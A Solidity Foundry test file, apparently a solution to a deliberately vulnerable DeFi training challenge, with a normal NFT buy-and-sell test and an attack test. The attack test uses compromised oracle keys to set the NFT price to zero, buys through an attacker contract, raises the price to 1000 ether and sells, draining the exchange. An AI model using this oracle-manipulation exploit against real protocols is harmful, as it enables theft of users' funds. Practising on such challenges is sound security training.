// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {UtilsTest} from "./Utils.t.sol";

contract ExchangeTest is UtilsTest {
    function setUp() public override {
        UtilsTest.setUp();
    }

    function testExchange() public {
        uint256 funds = trustfulOracle.getMedianPrice("DVNFT") * 2;
        vm.deal(buyer1, funds);
        vm.deal(buyer2, funds);

        vm.startPrank(buyer1);
        exchange.buyOne{value: trustfulOracle.getMedianPrice("DVNFT")}(); // bought NFT from some where lets say
        exchange.token().approve(address(exchange), 0); // approved the exchange to sell it for me or i will sell it lets say
        vm.stopPrank();

        exchange.token().ownerOf(0);

        console2.log(address(exchange).balance);
        vm.startPrank(buyer1);
        exchange.sellOne(0);
        vm.stopPrank();
    }

    function testAttack() public {
        // lets assume i decoded the data and got private keys
        // source1 is the attacker attacker now it has access to the keys
        vm.startPrank(source1);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.startPrank(source2);
        trustfulOracle.postPrice("DVNFT", 0);

        vm.deal(address(attacker), 10 ether);
        vm.startPrank(address(attacker));
        attacker.buy();
        vm.stopPrank();

        vm.startPrank(source1);
        trustfulOracle.postPrice("DVNFT", 1000 ether);
        vm.startPrank(source2);
        trustfulOracle.postPrice("DVNFT", 1000 ether);

        vm.startPrank(address(attacker));
        attacker.sell();
        vm.stopPrank();

        console2.log(address(attacker).balance); // 1.01e21
        console2.log(address(exchange).balance); // 0
    }
}
